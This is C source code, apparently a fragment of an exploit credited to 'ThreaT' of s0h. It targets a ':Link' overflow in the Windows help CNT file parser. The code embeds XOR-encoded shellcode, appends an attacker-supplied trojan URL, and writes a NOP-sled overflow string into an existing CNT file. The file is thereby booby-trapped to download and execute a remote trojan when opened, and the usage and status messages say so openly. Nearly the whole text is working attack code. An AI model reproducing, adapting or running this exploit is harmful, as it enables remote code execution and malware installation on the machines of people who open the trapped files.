int main (int argc, char *argv[]) {

	HANDLE ExploitFile;
	DWORD lpNumberOfBytesWritten, lpFileSizeHigh, FileSize;

	int i,j, len, RetByte=0xE5;

	char *file, *url;

unsigned char *Shellcode, *buffer,

RealGenericShellcode[] = 
"\x68\x5E\x56\xC3\x90\x8B\xCC\xFF\xD1\x83\xC6\x0E\x90\x8B\xFE\xAC"
"\x34\x99\xAA\x84\xC0\x75\xF8"

"\x72\xeb\xf3\xa9\xc2\xfd\x12\x9a\x12\xd9\x95\x12\xd1\x95\x12\x58\x12\xc5\xbd\x91"
"\x12\xe9\xa9\x9a\xed\xbd\x9d\xa1\x87\xec\xd5\x12\xd9\x81\x12\xc1\xa5\x9a\x41\x12"
"\xc2\xe1\x9a\x41\x12\xea\x85\x9a\x69\xcf\x12\xea\xbd\x9a\x69\xcf\x12\xca\xb9\x9a"
"\x49\x12\xc2\x81\xd2\x12\xad\x03\x9a\x69\x9a\xed\xbd\x8d\x12\xaf\xa2\xed\xbd\x81"
"\xed\x93\xd2\xba\x42\xec\x73\xc1\xc1\xaa\x59\x5a\xc6\xaa\x50\xff\x12\x95\xc6\xc6"
"\x12\xa5\x16\x14\x9d\x9e\x5a\x12\x81\x12\x5a\xa2\x58\xec\x04\x5a\x72\xe5\xaa\x42"
"\xf1\xe0\xdc\xe1\xd8\xf3\x93\xf3\xd2\xca\x71\xe2\x66\x66\x66\xaa\x50\xc8\xf1\xec"
"\xeb\xf5\xf4\xff\x5e\xdd\xbd\x9d\xf6\xf7\x12\x75\xc8\xc8\xcc\x66\x49\xf1\xf0\xf5"
"\xfc\xd8\xf3\x97\xf3\xeb\xf3\x9b\x71\xcc\x66\x66\x66\xaa\x42\xca\xf1\xf8\xb7\xfc"
"\xe1\x5f\xdd\xbd\x9d\xfc\x12\x55\xca\xca\xc8\x66\xec\x81\xca\x66\x49\xaa\x42\xf1"
"\xf0\xf7\xdc\xe1\xf3\x98\xf3\xd2\xca\x71\xb5\x66\x66\x66\x14\xd5\xbd\x89\xf3\x98"
"\xc8\x66\x49\xaa\x42\xf1\xe1\xf0\xed\xc9\xf3\x98\xf3\xd2\xca\x71\x8b\x66\x66\x66"
"\x66\x49\x71\xe6\x66\x66\x66";


printf (" * ***************************************************** *\n"
	" *                 s0h - Skin of humanity                *\n"
	" *                    http://s0h.cc/                     *\n"
	" * ***************************************************** *\n"
	"     Win32hlp exploit for : \":LINK overflow\"           *\n"
	" * ***************************************************** *\n"
	" * Discovered by ThreaT <*****@*****.**>.                 *\n"
	" * Coded by ThreaT <*****@*****.**>                       *\n"
	" * Hompage : http://s0h.cc/~threat/                      *\n" 
	" * Archive : http://s0h.cc/exploit/s0h_Win32hlp.c        *\n"
	" * ***************************************************** *\n"
	);

if (argc < 3)
{
	printf(
		" * ***************************************************** *\n"
		" * Usage : s0h_Win32hlp.exe <trojan> <CNT file> [offset] *\n"
		" *                                                       *\n"
		" * <trojan> = host to download the trojan (http:/-       *\n"
		" * /blah.plof/trojan.exe).                               *\n"
		" *                                                       *\n"
		" * <CNT file> = The CNT file.                            *\n"
		" *                                                       *\n"
		" * [offset] = Optionnal. This one defined a number betw- *\n"
		" * een 0 and 15 that can play with the return address. - *\n"
		" * Generaly, you must used 4 if the .HLP file is called  *\n"
		" * by an application.                                    *\n"
		" * ***************************************************** *\n"	
	);

	ExitProcess (1);
}

if (argv[3]) RetByte = atoi (argv[3]) + 0xE0;

len = taille + strlen (argv[1]) + 2 + 4;
url = (char *) malloc (strlen (argv[1]));
strcpy (url, argv[1]);

/*
* Create the final shellcode
*/

Shellcode = (unsigned char *) malloc (len);

// encrypt the URL
for (i=0;i<strlen (argv[1]); argv[1][i++]^=0x99);

// inject the RealGenericShellcode in the shellcode buffer
for (i=0;i<taille; Shellcode[i]=RealGenericShellcode[i++]);

// append crypted URL to the shellcode buffer
for (i,j=0;i<len - 1;Shellcode[i++]=argv[1][j++]);


Shellcode[len-6]=0x99; // URL delimitation
Shellcode[len-5]=0x2E; // f**k the winhlp32.exe parser

// append the RET ADDR
// Play with this bytes if the xploit don't work
Shellcode[len-4]=0x30;
Shellcode[len-3]=RetByte;
Shellcode[len-2]=0x06;
Shellcode[len-1]=0x00;


/*  Now, we make a vuln string for our exploit */

buffer = (unsigned char *) malloc (VulnLen);
memset (buffer,0,VulnLen);

lstrcpy (buffer,":Link ");
for (i=6; i < VulnLen - len; buffer[i++] = (char)0x90);
for (i,j=0; i < VulnLen; buffer[i++] = Shellcode[j++]);


/* Trap the CNT file specified with the vuln string */

ExploitFile = CreateFile (argv[2],GENERIC_READ+GENERIC_WRITE,
			  FILE_SHARE_READ+FILE_SHARE_WRITE,NULL,
			  OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);

if ( ExploitFile == INVALID_HANDLE_VALUE) {
	printf ("Error : cannot open cnt file '%s'\n",argv[2]);
	ExitProcess (1);
}

	FileSize = GetFileSize(ExploitFile, &lpFileSizeHigh);
	FileSize += lpFileSizeHigh*MAXDWORD;

	file = (char *)LocalAlloc (LPTR, FileSize + 2);
	file[0] = 0x0d;
	file[1] = 0x0a;
	file += 2;


	ReadFile(ExploitFile,file,FileSize,&lpNumberOfBytesWritten,NULL);
	
	SetFilePointer (ExploitFile,0,NULL,FILE_BEGIN);
	WriteFile (ExploitFile,buffer,VulnLen,&lpNumberOfBytesWritten,NULL);
	
	file -= 2;
	WriteFile (ExploitFile,file,FileSize+2,&lpNumberOfBytesWritten,NULL);
	
	CloseHandle(ExploitFile);
	
        printf (
		" * *******************************************************\n"
		" * The file is now traped and ready to download and exe- *\n"
		" * cute :                                                *\n"
		" * File : %s\n"
		" * At : %s\n"
		" * *******************************************************\n"
		,argv[2],url);
		
		if (RetByte != 0xE5)
			printf (
				" * *******************************************************\n"
				" * You have specified this address : 0x0006%x30          *\n"
				" * The abitrary will loaded since an application.        *\n"
				" * *******************************************************\n"
				,RetByte);
			

	return 0;
}